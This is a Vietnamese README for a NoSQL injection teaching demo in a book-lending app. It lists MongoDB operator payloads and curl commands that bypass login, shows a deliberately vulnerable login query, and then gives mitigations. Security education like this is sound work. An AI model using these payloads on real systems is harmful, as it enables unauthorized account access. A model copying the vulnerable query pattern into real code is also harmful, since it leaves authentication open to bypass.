# NoSQL Injection Demo - Hệ thống Quản lý Mượn Sách

## ⚠️ CẢNH BÁO BẢO MẬT

**ĐÂY LÀ DEMO VỀ LỖ HỔNG BẢO MẬT CHỈ PHỤC VỤ MỤC ĐÍCH GIÁO DỤC VÀ KIỂM THỬ BẢO MẬT!**

Không sử dụng trong môi trường production!

## 📋 Tổng quan

Đây là demo về lỗ hổng **NoSQL Injection** trong hệ thống quản lý mượn sách. Demo này bao gồm:

1. **Backend có lỗ hổng** - endpoint `/login-vulnerable` có thể bị tấn công
2. **Frontend demo** - sử dụng endpoint vulnerable
3. **Test suite** - tự động test các payload injection
4. **HTML demo** - giao diện web để test thủ công

## 🚀 Cách sử dụng

### 1. Khởi động Backend

```bash
cd book-management-backend
npm install
npm start
```

Server sẽ chạy tại `http://localhost:5000`

### 2. Khởi động Frontend (tùy chọn)

```bash
cd book-management-frontend
npm install
npm run dev
```

Frontend sẽ chạy tại `http://localhost:3000`

### 3. Test NoSQL Injection

#### 3.1 Sử dụng script tự động:

```bash
node test-nosql-injection.js
```

#### 3.2 Sử dụng HTML demo:

Mở file `nosql-injection-demo.html` trong trình duyệt

#### 3.3 Test thủ công với curl:

```bash
# Test bypass authentication cho độc giả
curl -X POST http://localhost:5000/api/login-vulnerable/reader \
  -H "Content-Type: application/json" \
  -d '{"MaDocGia": {"$ne": null}, "MatKhau": {"$ne": null}}'

# Test bypass authentication cho nhân viên
curl -X POST http://localhost:5000/api/login-vulnerable/staff \
  -H "Content-Type: application/json" \
  -d '{"TaiKhoan": {"$ne": null}, "MatKhau": {"$ne": null}}'
```

## 💥 Các Payload NoSQL Injection

### 1. Bypass Authentication

```json
{
  "MaDocGia": { "$ne": null },
  "MatKhau": { "$ne": null }
}
```

### 2. Regex Injection

```json
{
  "MaDocGia": { "$regex": ".*" },
  "MatKhau": { "$regex": ".*" }
}
```

### 3. Exists Operator

```json
{
  "MaDocGia": { "$exists": true },
  "MatKhau": { "$exists": true }
}
```

### 4. Greater Than Injection

```json
{
  "MaDocGia": { "$gt": "" },
  "MatKhau": { "$gt": "" }
}
```

### 5. OR Injection

```json
{
  "$or": [
    { "MaDocGia": { "$exists": true } },
    { "Email": { "$exists": true } }
  ],
  "MatKhau": { "$ne": null }
}
```

## 🔍 Phân tích lỗ hổng

### Code có lỗ hổng (login-vulnerable.js):

```javascript
// ❌ VULNERABLE CODE
let queryCondition = {};

if (typeof MaDocGia === "object") {
  queryCondition.MaDocGia = MaDocGia; // Lỗ hổng ở đây!
} else {
  queryCondition.MaDocGia = MaDocGia;
}

if (typeof MatKhau === "object") {
  queryCondition.MatKhau = MatKhau; // Lỗ hổng ở đây!
} else {
  queryCondition.MatKhau = MatKhau;
}

const docGia = await docGiaCollection.findOne(queryCondition);
```

### Vấn đề:

- Chấp nhận object làm input mà không sanitize
- Cho phép MongoDB operators như `$ne`, `$regex`, `$exists`
- Không có input validation
- Không có type checking

## 🛡️ Cách phòng chống

### 1. Input Sanitization và Validation

```javascript
// ✅ SECURE CODE
if (typeof MaDocGia !== "string" || typeof MatKhau !== "string") {
  return res.status(400).json({
    message: "Dữ liệu đầu vào không hợp lệ!",
  });
}

// Chỉ sử dụng string values
const docGia = await docGiaCollection.findOne({
  MaDocGia: MaDocGia.toString(),
});

// So sánh password với bcrypt
const isValidPassword = await bcrypt.compare(MatKhau, docGia.MatKhau);
```

### 2. Schema Validation với Joi

```javascript
const Joi = require("joi");

const loginSchema = Joi.object({
  MaDocGia: Joi.string().alphanum().min(3).max(30).required(),
  MatKhau: Joi.string().min(6).required(),
});

const { error, value } = loginSchema.validate(req.body);
if (error) {
  return res.status(400).json({
    message: "Dữ liệu không hợp lệ: " + error.details[0].message,
  });
}
```

### 3. Sanitize MongoDB queries

```javascript
const mongoSanitize = require("express-mongo-sanitize");

// Middleware để loại bỏ MongoDB operators
app.use(mongoSanitize());
```

### 4. Sử dụng bcrypt cho password

```javascript
// Hash password khi đăng ký
const hashedPassword = await bcrypt.hash(password, 10);

// So sánh password khi đăng nhập
const isValid = await bcrypt.compare(inputPassword, user.hashedPassword);
```

## 📁 Cấu trúc files

```
├── nosql-injection-demo.html          # HTML demo interface
├── test-nosql-injection.js            # Automated test suite
├── NOSQL-INJECTION-README.md          # Tài liệu này
├── book-management-backend/
│   ├── routes/
│   │   ├── login.js                   # Secure login endpoint
│   │   └── login-vulnerable.js        # Vulnerable login endpoint ⚠️
│   └── server.js                      # Updated to include vulnerable route
└── book-management-frontend/
    └── src/views/Login.vue             # Updated to use vulnerable endpoint
```

## 🎯 Kết quả mong đợi

Khi chạy test, bạn sẽ thấy:

```
✅ SUCCESS - NoSQL Injection worked!
User info: {
  MaDocGia: 'DG001',
  HoTen: 'Nguyễn Văn A',
  Email: 'nguyenvana@email.com',
  hasToken: true
}
```

Điều này chứng minh lỗ hổng cho phép bypass authentication thành công!

## 📚 Tài liệu tham khảo

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)

## ⚖️ Trách nhiệm pháp lý

Demo này chỉ phục vụ mục đích:

- Giáo dục về bảo mật ứng dụng web
- Kiểm thử bảo mật (penetration testing)
- Nghiên cứu lỗ hổng bảo mật

**KHÔNG** sử dụng để:

- Tấn công hệ thống không được phép
- Thực hiện các hoạt động bất hợp pháp
- Triển khai trong môi trường production

Người sử dụng chịu hoàn toàn trách nhiệm về việc sử dụng demo này.
